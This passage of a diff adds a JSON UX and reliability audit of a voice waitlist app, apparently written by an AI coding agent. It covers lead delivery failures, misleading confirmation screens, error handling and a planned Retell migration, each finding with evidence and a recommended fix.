+        "evidence": "V/log-*.txt 'cta' across 5 live runs: FCP 1536/1600/1784/2000/1948 ms and CTA usable (boot gone, opacity 1) at 3284/3336/3523/3720/3698 ms, a constant gap of 1720-1750 ms. Causes:\n- MIN_BOOT_MS 900 + BOOT_FADE_MS 500 (mary-app.tsx:78-79).\n- Entrance delays up to 0.45 s + 0.7 s (landing.tsx:77-81).\n- The whole app is ClientOnly, so the server HTML contains only the boot screen (src/routes/index.tsx:39).\nJS: 107.5 KB + 94.6 KB + 11.4 KB compressed.",
+        "user_impact": "Every visitor, including returning ones and ad clicks, waits nearly 2 s of pure animation before they can press Start. It feels slow rather than premium.",
+        "recommendation": "Server-render the landing (keep only the call engine client-side), which removes the boot gate. If it stays, show it only when hydration takes more than 300 ms and set MIN_BOOT_MS to 0. Bring the CTA in first, at ≤250 ms, with the decorative preview after it.",
+        "effort": "M",
+        "retell": "independent"
+      },
+      {
+        "title": "Retell changes the data the orb, caption and pills are built on; design for it now",
+        "severity": "P2",
+        "area": "orb/motion",
+        "evidence": "Retell web-call docs (fetched 2026-09-26, V/../../retell/deploy_web-call.md):\n- :158 — onAudio snapshots 'contain incoming audio', i.e. the agent only, with no visitor level for the 'hearing you' state.\n- :126 — transcript 'can change as a turn progresses and does not mark exact speaking boundaries'.\n- :129 — the transcript socket is optional and 'This failure does not fire onError'.\nSDK 3.0.1 base-session.ts:290-297 allocates a new Float32Array(fftSize) and emits it on every animation frame. Option B gives the browser no structured fields mid-call (docs/architecture/retell-migration.md step 5: fields arrive only via save_lead). URL: https://docs.retellai.com/deploy/web-call",
+        "user_impact": "If the current UI is rewired as-is:\n- The word-synced reveal can't be driven.\n- The pills stay empty until the end.\n- Captions can silently freeze.\n- The orb's 'hearing you' state has no input.\n- A second per-frame loop is added.",
+        "recommendation": "- Map states to Retell events: status connecting→'Connecting', agent_start_talking/agent_stop_talking→speaking, a local mic analyser→hearing.\n- Compute the level inside the orb's own frame at ≤30 Hz rather than subscribing to every 'audio' event.\n- Render streamed transcript chunks with a short per-chunk fade instead of karaoke.\n- Show a 'captions unavailable' state when the transcript socket drops.\n- Drive the pills from a per-field custom function or transcript extraction.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Header controls are inconsistent and cryptic on phones; the talk-mode toggle breaks the ARIA toggle pattern",
+        "severity": "P3",
+        "area": "accessibility",
+        "evidence": "V/shots/390x844-light-5-call-idle.png: the talk-mode button is a ringed 32x44 capsule showing a radio-wave icon, next to a bare speaker icon (call-stage.tsx:158 has ring-1, :169 does not; text is hidden below sm). Its aria-label changes with state while aria-pressed is also set (call-stage.tsx:152-157). APG: 'it is critical the label on a toggle does not change when its state changes' (https://www.w3.org/WAI/ARIA/apg/patterns/button/).",
+        "user_impact": "On phones nobody can tell that the radio icon means 'go hands-free', and the two controls look like they belong to different apps. Screen readers announce a changing name plus a pressed state.",
+        "recommendation": "Use one control style: two 44-px pill buttons with icon and short label ('Hands-free', 'Sound'). Or put a segmented 'Hold | Hands-free' switch above the composer. Keep a fixed label ('Hands-free') with aria-pressed, or drop aria-pressed and keep the changing label.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Three to four 'thinking' signals and a stack of small status lines compete during a turn",
+        "severity": "P3",
+        "area": "conversation",
+        "evidence": "V/shots/390x844-light-2-call-thinking.png shows at once:\n- the swirling orb\n- a caption '…'\n- the hold button 'Thinking… hold to talk'\n- the status line 'Thinking…'\n- the 3-part 'Can't hear her?' row.\nCode: call-stage.tsx:255, composer.tsx:97, composer.tsx:13, composer.tsx:320-338.",
+        "user_impact": "The bottom of the screen reads as a wall of small warnings rather than one calm voice interface. Premium voice UIs show one state at a time.",
+        "recommendation": "Let the orb and one caption-area state word ('Thinking') carry state. Keep the hold button's label constant ('Hold to talk'). Reserve the single status line under the composer for errors and hints only.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "End screen: email breaks mid-word, and at 1440x900 the restart link is below the fold",
+        "severity": "P3",
+        "area": "end screen",
+        "evidence": "'sarah@brightpathrealty.co|m' at 390 px, 'sarah@brightpathre|alty.com' at 768, 'brightpathrealt|y.com' at 1440 (V/shots/390x844-light-10-end.png, V/shots/768x1024-light-10-end.png, V/shots/1440x900-light-10-end.png). Code: end-screen.tsx:162-167 (two-column dl, break-words). The details card ends below 900 px, so 'Start another conversation' needs a scroll on a 1440x900 laptop.",
+        "user_impact": "The confirmation, the moment that should feel most finished, shows a broken-looking email.",
+        "recommendation": "Make the email row col-span-2 (like operations). Use `break-all` only as a last resort, or `truncate` with a title. Tighten the vertical rhythm on short desktop heights (orb 0.24*vh, mt-6) so the full summary fits above 900 px.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "No dark theme, and the browser theme-color does not match the page background",
+        "severity": "P3",
+        "area": "visual design",
+        "evidence": "V/shots/390x844-dark-1-landing.png renders the same cream light theme under prefers-color-scheme: dark: styles.css:79 forces color-scheme: light, and the .dark variant is never applied. theme-color is #f8f7f2 (src/routes/__root.tsx:87, public/site.webmanifest), but the page background token computes to #fbfaf7 (V/contrast.mjs), leaving a faint seam where the browser chrome is tinted. The orb shader's ground shadow is tuned for cream paper (orb-renderer.ts header comment and the shadow term).",
+        "user_impact": "Night-time visitors in dark mode get a bright full-screen page, and the toolbar tint is slightly off.",
+        "recommendation": "Set theme-color and the manifest colours to #fbfaf7 now (S). A proper dark call screen (ink background, lighter shadow term in the shader) is optional polish, not needed for launch.",
+        "effort": "M",
+        "retell": "independent"
+      }
+    ]
+  },
+  "reliability": {
+    "summary": "I forced each failure against the local dev server with every /api/* and /_serverFn route mocked, using the iPhone 13 profile plus a desktop profile for the double-click test. I also read mary-app.tsx, conversation/*, voice/*, lead-sync, lead-lifecycle, the API routes and Code.gs. I made 0 live AI calls. The only live requests were GET /api/lead and static bundle files. Scripts, JSON logs and 74 screenshots are in /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/reliability/. The healthy path works: sign-up by holding or typing, cutting in while she speaks, switching tabs or locking the phone and coming back, and reopening the mic after its track dies. When something fails, though, the app almost never tells the visitor the truth, and it has no path that works without AI. A replay of the 2026-09-23 outage gives an opening line that apologises for \"losing my train of thought\", then \"Didn't catch that\" for every hold, then typed answers that get no reply at all. Hung requests, a 150 ms brush of the Hold button, or an empty transcript each leave MARY silent or stuck on \"Thinking…\" indefinitely. The biggest problem is outside the voice code: the live site reports {\"configured\":false} for the lead sheet, yet the end screen shows \"Early access confirmed, position #707\", a number made from a hash of the email. Every lead today stays only in the visitor's own browser. Retell removes the speech-to-text, text-to-speech and turn-taking failures. The lead delivery, honest end-screen copy, mic-error wording, the no-AI fallback, the Start guard and failure telemetry are ours and must be carried into Retell. GAP-REGISTER.md, which the task asked me to read, is not in the repo on any branch.",
+    "findings": [
+      {
+        "title": "Live site sends no lead anywhere, but tells the visitor they are confirmed with a made-up position",
+        "severity": "P0",
+        "area": "lead delivery",
+        "evidence": "curl https://omnisuite.omnikom.io/api/lead -> {\"configured\":false} (2026-09-26). lead-lifecycle.ts:124-125 turns that into sync \"local\". The position comes from waitlist-store.ts:122-125 (128 + hash % 640). Screenshot /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/reliability/s01-end-unconfigured.png shows 'EARLY ACCESS CONFIRMED · You're on the list, Sam · Early access position #707'. PROJECT-STATE.md:64: Apps Script deployed, SHEETS_WEBAPP_URL never set.",
+        "user_impact": "Every visitor who signs up on the live site today is lost to the operator; the lead exists only in the visitor's own localStorage. The visitor is still promised a queue position that nothing backs.",
+        "recommendation": "Now: set SHEETS_WEBAPP_URL + SHEETS_WEBAPP_SECRET in Lovable and run one real call end to end. In code: show a position only when sync==='sheet'. For sync 'local' or 'failed', use honest copy (\"We've got your details\") and give /api/lead a server-side fallback store (e.g. Cloudflare KV/D1, or an email to the operator) so a lead never lives only in the visitor's browser (lead-lifecycle.ts:124-132, end-screen.tsx:74-102).",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "During an AI outage MARY loops on apologies with no fallback, and the lead is never captured",
+        "severity": "P0",
+        "area": "errors",
+        "evidence": "Replay of 2026-09-23 (.claude/POSITION.md:81: turn 200 {\"type\":\"error\"}, speech and transcribe 502, fallback server function 500). Screenshots s02-error-line-1-welcome.png through -7 and s02-502-*.png in /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/reliability/. The opening line is 'Sorry — I lost my train of thought there. Could you say that once more?' (mary-stream.ts:126-128), cut off at 'Could you say' in the caption box. Holds get 'Didn't catch that. Hold, speak close to the phone' because transcribe 502 is turned into '' at audio-engine.ts:2171. In the 502 variant every message gets 'I hit a snag on my side' (turn-runner.ts:34,185-186). When the tab closes, the beacon carries name '' and email '' (s02-error-line.json).",
+        "user_impact": "For the hours of an outage, every visitor gets a broken, apologising MARY with no voice and a hint to check their own volume. They can never finish; the name and email they type are never pulled out of the text, and with no sheet configured nothing reaches the operator.",
+        "recommendation": "Count consecutive turn failures in TurnRunner. After 2, replace the conversation with a no-AI inline form (\"MARY's line is down — leave your name and email and the team will follow up\") that POSTs to /api/lead. Add a cheap GET /api/health that checks the gateway, so the landing can offer 'type or leave details' before Start. Treat non-2xx/timeouts from transcribe as a service error, not 'speak closer'.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Near-repeat filter can swallow her whole reply: typed answers get no reply and the orb stays on 'thinking'",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "s02-error-line-4-typed1.png, -5-typed2.png, -6-typed2-plus15s.png, -7-typed3.png: after each typed answer there is no MARY line, the caption shows '…' and the status says 'Thinking…' 15+ s later. Network log: /api/turn, then the /_serverFn retry fails, then nothing is spoken. turn-runner.ts:129-152 skips a reply that is a near-repeat of an earlier line even after the retry fails. Presence is set to thinking at turn-runner.ts:100 and nothing resets it when no line is said.",
+        "user_impact": "The visitor types, sees '…' forever and does not know whether to wait, retype or leave. The same thing can happen with a healthy gateway whenever the model repeats itself twice.",
+        "recommendation": "Never end a turn without output: if the final line is suppressed, say a rotating short bridge or show an inline 'MARY didn't answer — Retry' chip, and reset presence to idle in the finally block. Vary the fallback copy so the retry isn't itself a near-repeat.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "One hung request freezes the call for good, and messages typed meanwhile vanish",
+        "severity": "P1",
+        "area": "errors",
+        "evidence": "/api/turn and the fallback both hang: 'MARY … / Thinking…' at 5, 14, 18, 30, 60 and 90 s (s03-turn-fn-hang-*.png). A message typed at 30 s never appeared on screen and no request was ever sent (s03-turn-fn-hang.json). Causes: the fallback maryTurn has no timeout (mary-stream.ts:46-54, and mary.functions.ts:595 streamText has no abortSignal), and ADD_LINE runs inside the serial queue (turn-runner.ts:65-71, 83-91). A transcription hang gives 45 s of 'Thinking…' (s04-transcribe-hang-45s.png): no signal on the client fetch (audio-engine.ts:2170) and no upstream timeout (routes/api/transcribe.ts:33-37).",
+        "user_impact": "A slow or stuck upstream silently kills the conversation. The visitor's own words disappear from the screen, which reads as the app ignoring them.",
+        "recommendation": "Put AbortSignal.timeout on every client fetch (fallback turn about 12 s, transcribe about 10 s) and on the server function's streamText and the transcribe upstream fetch. Dispatch ADD_LINE for the user's message synchronously in send(), before enqueue. A newer send() should abort the in-flight turn instead of queuing behind it. On timeout, show a retry chip.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "A brush or mis-tap of the Hold button kills her turn: dead air, and what the visitor said is lost",
+        "severity": "P1",
+        "area": "turn-taking",
+        "evidence": "A 150 ms tap while she was thinking about 'My name is Sam Rivera': no reply ever, the name is not saved (localStorage empty) and no lead checkpoint is sent (s04-tap-while-thinking-2-after.png, -3-plus20s.png). A 150 ms brush during the greeting: she stops at 'Hi,…' and never asks her question (s04-brush-while-speaking-1.png). onPress calls runner.interrupt() before the hold is known to be real (mary-app.tsx:184-191, turn-runner.ts:78-81, 99). A hold under 300 ms only calls onCancel (hold-talk.ts:494-497). SET_COLLECTED comes after the stale check (turn-runner.ts:127,146-148). The button is a 64 px full-width bar in the thumb zone (composer.tsx:83).",
+        "user_impact": "A thumb resting near the bottom of the phone stalls the call with no prompt on screen. Details the visitor already gave (e.g. their name) are discarded, so MARY has to ask again.",
+        "recommendation": "On press, pause her line rather than stopping it. Commit the interrupt only once the hold passes MIN_HOLD_MS and produces words. On onCancel/onMissed, resume the paused line or re-run the dropped turn. Always apply turn.collected even when the turn is stale.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Failed transcription blames the visitor, and any empty transcript leaves 'Thinking…' stuck",
+        "severity": "P1",
+        "area": "turn-taking",
+        "evidence": "/api/transcribe 502 comes back as '' (audio-engine.ts:2171), which shows 'Didn't catch that. Hold, speak close to the phone' (s02-error-line-2-hold1.png). On healthy services, a hold that transcribes to 'Thank you.' or 'Bye.' is dropped by the hallucination filter (audio-engine.ts:2158-2160,2174), and the orb still says 'MARY is thinking' with the button reading 'Thinking… hold to talk' 20 s later (s04-empty-transcript-2-plus20s.png). Cause: onRelease sets thinking (mary-app.tsx:192-195), but waiting() only resets from 'hearing' (mary-app.tsx:175-179).",
+        "user_impact": "Visitors are told to speak closer when the service is down. After a miss, the screen claims MARY is thinking when nothing is happening, so people wait instead of pressing again. Saying 'thank you' or 'bye' is ignored.",
+        "recommendation": "Return an error from transcribe() for non-2xx and timeouts, and show 'I couldn't process that just now — hold again or type'. In waiting(), reset presence to idle from both 'thinking' and 'hearing'. Don't apply the hallucination filter to held clips with real peak and more than 600 ms of audio.",
+        "effort": "S",
+        "retell": "solved_by_retell"
+      },
+      {
+        "title": "End screen confirms the sign-up even when the sheet write failed, and nothing retries",
+        "severity": "P1",
+        "area": "end screen",
+        "evidence": "With /api/lead returning 500, the end screen shows 'EARLY ACCESS CONFIRMED · You're on the list, Sam. · Your details are saved. Your position comes with the confirmation.' (s01-end-500.png). finalize() sends one syncLead with a 9 s timeout and never retries (lead-lifecycle.ts:118-133, lead-sync.ts:77). Checkpoints are fire-and-forget (lead-lifecycle.ts:89-93). 'saved' copy: end-screen.tsx:93-101.",
+        "user_impact": "If the Apps Script blips at the final save (quota, cold start, the 9 s timeout), a completed sign-up is lost, while the visitor is told their details are saved.",
+        "recommendation": "Keep an outbox in localStorage keyed by sessionId. Retry with backoff (3 tries), send a beacon on pagehide, and flush the outbox on the next page load. Use honest copy while pending or failed, plus a Retry button and a contact fallback.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Mic denied or missing gives a generic message that points to a mic button that does not exist",
+        "severity": "P1",
+        "area": "start/permission",
+        "evidence": "s04-mic-denied-1-after-welcome.png and s04-no-mic-1-after-welcome.png both show 'I couldn't open the microphone. Tap the mic button to try again'. The specific message from primeMicPermission is overwritten because hold-recorder.ts:118 throws a raw DOMException, which micMessage maps to 'unknown' (text.ts:116). Hold mode renders no mic button (composer.tsx:230; measured micButton=false). Each Hold press calls getUserMedia again with no visible change (gum count 3). The in-app-browser 'Open in browser' guidance (text.ts:100-104) can never show in hold mode.",
+        "user_impact": "People who denied the mic, or who arrive from Instagram or LinkedIn in-app browsers, get wrong instructions and keep pressing a Hold button that cannot work. Typing still works, but nothing steers them to it clearly.",
+        "recommendation": "In HoldRecorder.openLine, wrap getUserMedia errors in MicUnavailableError(micFailureFrom(e)). Don't overwrite a specific mic error with 'unknown'. In hold mode, say 'hold the button to ask again'. On denied or no-device, switch to typing-first: disable Hold and show a short iOS Settings hint.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Going offline mid-call is reported as a server snag and a broken microphone, and the error stays after recovery",
+        "severity": "P2",
+        "area": "errors",
+        "evidence": "Offline, typed: 'I hit a snag on my side — could you try that once more?' Offline, held: the transcribe fetch throws, hold-talk.ts:505-509 calls onError, and mary-app.tsx:206-209 shows 'I couldn't open the microphone…' and sets mic.live=false, which also starts idle nudges. Back online with a normal answer, the mic error is still on screen (s04-offline-2-held-offline.png, s04-offline-3-back-online.png). No navigator.onLine or online/offline handling anywhere in src/features/mary.",
+        "user_impact": "On conference Wi-Fi the visitor is misled about what broke (their mic or MARY) and may give up, even though retrying would have worked.",
+        "recommendation": "Listen for offline/online events and show 'You're offline — I'll carry on when you're back'. Queue the typed message and send it automatically on 'online'. Route network errors away from micMessage, and clear mic.error after the next successful hold.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Reload mid-call wipes the conversation, and the sheet's transcript gets overwritten",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "After 2 answers and a reload: back to the landing with no 'continue', and a fresh welcome with messages=[] (only the collected fields are restored, mary-app.tsx:467-474). She reintroduces herself while the progress pills already show name and email (s04-reload-3-restarted.png). The next checkpoint sends turns:0 and a short transcript (s04-reload.json), which Code.gs:210 writes over the full transcript.",
+        "user_impact": "An accidental pull-to-refresh or iOS tab reload restarts the pitch, and the operator loses the pre-reload transcript.",
+        "recommendation": "Persist lines and flags in sessionStorage per sessionId and offer 'Pick up where you left off'. Make the Apps Script keep the longer transcript, or append to it, instead of overwriting.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Double-clicking Start opens two mics and runs two welcomes (3 AI calls instead of 1)",
+        "severity": "P2",
+        "area": "start/permission",
+        "evidence": "Desktop double-click (s04-double-tap-desk.json): 2 getUserMedia calls and 2 live mic streams, /api/turn welcome ×2 plus a /_serverFn repeat-retry, and a second greeting about 4.4 s after the first. start() checks the stage at mary-app.tsx:510 but only sets it at :531, after two awaits. primeMicPermission overwrites primedStream (audio-engine.ts:1305-1307), leaving the first stream with no owner to stop it. Not reproduced on the iPhone profile.",
+        "user_impact": "She greets twice, the laptop's mic indicator can stay on, and each impatient double-click adds paid calls.",
+        "recommendation": "Set a starting ref synchronously at the top of start() and disable both landing buttons. In primeMicPermission, share the in-flight promise instead of calling getUserMedia again.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "When the speech service hangs, every line sits dim for about 9 s; during outages the screen gives conflicting 'can't hear her' advice",
+        "severity": "P2",
+        "area": "errors",
+        "evidence": "With /api/speech hung, the line stays at 20% opacity as 'MARY is speaking' until the 9 s first-byte guard fires (audio-engine.ts:1076-1078), and again for the follow-up (s03-speech-hang-3s/6s/9.5s/12s.png): about 19 s per two-beat turn, with a fresh request each line. During a 502, 'Can't hear her? Turn the volume up and tap Play sound' shows next to 'My voice didn't come through just now' (s02-error-line-1-welcome.png). Play sound re-requests /api/speech (audio-engine.ts:660-669).",
+        "user_impact": "Slow speech turns every turn into a long wait. In an outage the visitor is sent to fiddle with their volume, and each tap on Play sound is another failing paid request.",
+        "recommendation": "Add a circuit breaker: after one speech failure, reveal text at once and switch to voice-off for 60 s with a 'Voice unavailable — reading mode' note. Lower the first-byte guard to about 4 s. Hide silentHint while voiceFailed is shown.",
+        "effort": "S",
+        "retell": "solved_by_retell"
+      },
+      {
+        "title": "Long silence never ends the call; the mic stays live and PR #2's wake lock keeps the screen on",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "90 s after the welcome in hold mode: no nudge, no timeout, 1 live mic stream (s04-silence-0.png vs s04-silence-90s.png). Idle nudges only run when the mic is not live or is muted (mary-app.tsx:378-398). The wake lock is held for the whole call (mary-app.tsx:274-286).",
+        "user_impact": "A visitor who walks away leaves a phone awake with the mic indicator on. No partial lead is written if they gave no field.",
+        "recommendation": "After about 45 s with no press, speak one gentle nudge. After about 3 min, show 'Still there? Continue / Leave your email', release the mic and wake lock, and flush the lead as abandoned.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "No client telemetry on handled failures: outages are only found by hand",
+        "severity": "P2",
+        "area": "errors",
+        "evidence": "Only the root error boundary reports (__root.tsx:37-42, lovable-error-reporting.ts). The window.__lovableEvents.track type exists but is never called. error-capture.ts is server-only. Turn fallbacks, SNAG lines, speech onError, transcribe non-2xx and lead sync 'failed' are never reported. The 2026-09-23 outage was found by manual probing (.claude/POSITION.md:81).",
+        "user_impact": "The operator cannot see that visitors are hitting broken calls, so an outage can run for hours (as on 2026-09-23).",
+        "recommendation": "Send small events (turn_fallback, speech_failed, transcribe_failed, lead_sync_failed, mic_error with the reason) via __lovableEvents.track or a /api/event beacon. Add an hourly synthetic check of /api/turn and /api/speech with alerting.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Live build has no screen wake lock (PR #2 adds it), and Retell's SDK will not add one either",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "The live bundle https://omnisuite.omnikom.io/assets/routes-DZfdjxLS.js contains no 'wakeLock' (grep, 2026-09-26). PR #2 adds it at mary-app.tsx:51-75. retell-client-js-sdk 3.0.1 (npm, published 2026-09-08) src has no wakeLock or visibilitychange handling (scratchpad/retell/client/package/src).",
+        "user_impact": "On the live site, an iPhone that auto-locks mid-call suspends her voice and the mic.",
+        "recommendation": "Merge and publish PR #2. Keep holdScreenAwake around the Retell call (request it in the Start tap, re-acquire it on visibilitychange).",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Retry notices stay up after the visitor switches to typing",
+        "severity": "P3",
+        "area": "typing fallback",
+        "evidence": "'Didn't catch that…' and 'Loud in here? Type your answer below instead.' remain after typed messages and cover the caption area (s02-error-line-6-typed2-plus15s.png). send() (mary-app.tsx:538-544) does not clear missedHold or suggestTyping, unlike onText (mary-app.tsx:196-199).",
+        "user_impact": "Old error copy sits on top of the conversation and hides MARY's caption on small phones.",
+        "recommendation": "Clear missedHold and suggestTyping in send() and at the start of each turn.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "The gap register the docs rely on is not in the repo",
+        "severity": "P3",
+        "area": "copy/trust",
+        "evidence": "CLAUDE.md:7 and PROJECT-STATE.md:60 point to docs/audit/GAP-REGISTER.md, and retell-migration.md cites VA-01…VA-10, AI-04 and D2 from it. `git log --all -- docs/audit` returns nothing and the file exists on no branch.",
+        "user_impact": "There is no way to check which known reliability gaps are still open, and the Retell plan's 'what this fixes' list cannot be checked.",
+        "recommendation": "Commit docs/audit/ (register + area files) or remove the references. Add the findings above to it with status.",
+        "effort": "S",
+        "retell": "independent"
+      }
+    ]
+  },
+  "leads": {
+    "summary": "I traced a lead from start to finish: MARY's checked fields (mary-grounding.ts), then LeadLifecycle (it saves to the browser first, sends an in-progress copy 5 s after the last field change, sends the final save, and fires a beacon when the tab is hidden or closed), then /api/lead, the Apps Script sheet, the end screen and the owner view. I checked the behaviour by driving the local build with mocked APIs through 8 scenarios, and I fetched the live /api/lead status and bundle. Evidence is in scratchpad/ux-audit/leads/. That used 0 paid AI calls and sent 0 lead POSTs to the live site. Verdict: the live site delivers no leads today. GET /api/lead still returned {\"configured\":false} at 2026-09-26 03:10 UTC, three days after the conference. Meanwhile every visitor sees \"Early access confirmed\" with a made-up position number. Even after the sheet is connected, leads can still be lost or corrupted in several ways: the final save is sent once and never retried, the email is asked last, emails are not validated, no confirmation email is sent, nobody is alerted when a lead or callback arrives, visitors on a shared device or with storage blocked end up writing to someone else's row, and repeat sign-ups become duplicates. Retell fixes MARY saying \"it's saved\" before anything is saved, and it adds signed, retried webhooks and a lasting call history. It does not give leads a home, send confirmations or alerts, or change the email-last order. The Retell plan's webhook also writes nothing when the sheet is not configured, so those guarantees have to be go-live gates.",
+    "findings": [
+      {
+        "title": "The live site delivers zero leads: the Google Sheet is still not connected",
+        "severity": "P0",
+        "area": "lead delivery",
+        "evidence": "GET https://omnisuite.omnikom.io/api/lead at 2026-09-26T03:10:39Z -> {\"configured\":false} (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/leads/get-api-lead.txt). src/routes/api/lead.ts:20,54-72: when not configured nothing is written and the payload is not even logged. PROJECT-STATE.md:64 has listed setting SHEETS_WEBAPP_URL/SECRET as pending since 2026-09-23, the conference day (.claude/POSITION.md 'conference is TODAY'). The owner view's own copy says 'entries stay on each visitor's device' (src/components/waitlist-vault.tsx:94).",
+        "user_impact": "Every conversation since launch, including the 2026-09-23 conference, exists only in the localStorage of whichever phone had it. Visitors' own phones can't be reached, and no server log or database holds the leads. The owner has 0 leads and doesn't know it.",
+        "recommendation": "Today: set SHEETS_WEBAPP_URL and a non-empty SHEETS_WEBAPP_SECRET in Lovable, Publish -> Update, confirm GET /api/lead returns configured:true, reachable:true, then run one real call and watch the row appear. If a booth or demo device was used, open the owner view on it now (Ctrl/Cmd+Shift+O, or 5 taps on 'omnikom') and Export CSV. Safari wipes script-written storage after 7 days without interaction (WebKit ITP, https://webkit.org/blog/10218/full-third-party-cookie-blocking-and-more/). Add an uptime or CI check that fails when production reports configured:false.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Visitors are told they're confirmed with a made-up position number, whether or not anything was saved",
+        "severity": "P1",
+        "area": "end screen",
+        "evidence": "Local build, /api/lead mocked the way live answers. Unconfigured: 'EARLY ACCESS CONFIRMED ... Early access position #149' (.../ux-audit/leads/unconfigured-end-later.png). #149 is positionFor(sessionId), frozen at the first local save (src/lib/waitlist-store.ts:122-125,134). The payload sent localPosition 156, which is positionFor(email) (lead-lifecycle.ts:72; unconfigured.json). Two sign-ups by the same person showed #690 and then #250 (again.json). With a 500: 'Your details are saved. Your position comes with the confirmation.' (lead500-end-later.png; end-screen.tsx:100). With a 12 s hang: 'Securing your place…' followed by the same 'saved' line (leadhang-end-*.png). Callback with a 500: 'Your request is with the Omnikom team ... The team receives your request straight away' (callback500-end-later.png; text.ts:69-71). Callbacks never show a sync state (end-screen.tsx:71 checks signed_up only). The live bundle contains the same code (`128+t%640` and both strings in /assets/routes-DZfdjxLS.js). The spec says 'Only say it's recorded after it actually saved' (docs/mary-voice.md:338), but the CALLBACK FINAL TURN prompt (mary-prompt.server.ts:112) has her say it's with the team before finalize() posts anything.",
+        "user_impact": "While the sheet is off, every visitor leaves believing they hold a numbered spot ('Invitations go out in order of position', text.ts:90). Nobody will contact them, and they have no reason to try again. After the sheet is connected, any failed save still looks like a success.",
+        "recommendation": "lead-lifecycle.ts:124-132: map !configured and failed to an honest state. end-screen.tsx: show a position only when sync==='sheet'. For failed or local, show 'Saving didn't go through yet — retrying' plus the retry outbox from the next finding, and if it still fails, a prefilled mailto fallback. Remove positionFor from the UI path entirely. Handle the callback branch the same way. Make MARY's final callback line depend on the save result, or change it to 'I'm sending this to the team now'.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "A failed final save is sent once and never retried",
+        "severity": "P1",
+        "area": "lead delivery",
+        "evidence": "finalize() posts once (src/features/mary/conversation/lead-lifecycle.ts:116-123) and sets finished=true (line 100). After that, flush() returns early (line 146) and the pagehide beacon never resends. The checkpoint is a trailing debounce (lines 88-93), so in lead500.json the only /api/lead POST of the whole conversation was the final one at t=21.9 s. Measured causes of failure: the per-IP limit of 20/min (api-guard.ts:24) returned 429 from the 21st POST in a minute (.../ux-audit/leads/schema-probe.out.json); the Worker gives the sheet 9 s (lead.ts:63), but the Apps Script can wait up to 25 s for its lock (Code.gs:127).",
+        "user_impact": "One 429, 5xx, timeout or offline blip at the end of a call loses the finished status and whatever arrived in the last turns. That is often the email, which is asked last. The visitor is still told it saved. Conference Wi-Fi, where many visitors share one IP, and bursts of people finishing together make this more likely.",
+        "recommendation": "Add a localStorage outbox. Queue every payload, delete it only on saved:true, retry with backoff while the page is open, send it with sendBeacon on pagehide, and replay it on the next load. Upserts by sessionId are already idempotent (Code.gs:173). Key the /api/lead rate limit by sessionId, or raise it, because a venue shares one IP. Turn the checkpoint into a throttle with a maximum wait instead of a pure debounce.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "The email is asked last, so anyone who leaves early is an uncontactable row",
+        "severity": "P1",
+        "area": "conversation",
+        "evidence": "Phase order is DISCOVER -> REVEAL -> LANES -> CONTACT (src/lib/mary-prompt.server.ts:118-125). The canonical worked example has 5 visitor answers before 'best email?' (docs/mary-voice.md:437-459). In a mocked session that left after 2 answers, both the checkpoint and the abandoned beacon carried name and business but email:'' and phone:'' (.../ux-audit/leads/leave.json).",
+        "user_impact": "Someone who drops out at answer 1-5 (a loud floor, audio trouble, being pulled away) leaves a name and a company and no way to reach them. That row isn't a lead.",
+        "recommendation": "Ask for the email right after the name and the first discovery beat (e.g. 'So I can hold your spot while we talk — best email?'), or add an optional 'Leave your email' field that is visible from the first turn and writes through SET_COLLECTED. The reveal still works when the email is already known. Add a unit test that pins the phase order.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "MARY promises a confirmation email that is never sent",
+        "severity": "P1",
+        "area": "copy/trust",
+        "evidence": "There is no email-sending code in src/ (grep for resend|sendgrid|postmark|smtp|MailApp finds nothing). MARY asks 'So I know where to send your early-access confirmation — best email?' (docs/mary-voice.md:193,509) and answers 'Only to confirm your spot and send your launch details' (mary-voice.md:386). The Retell plan's fallback line tells visitors 'the team will confirm by email' (scratchpad/retell/plan.md:491).",
+        "user_impact": "The visitor never gets the promised confirmation and has nothing in their inbox to find the product again. A misheard email is never caught, because nothing is ever sent that could bounce. With voice-captured emails, that is the main way leads quietly die.",
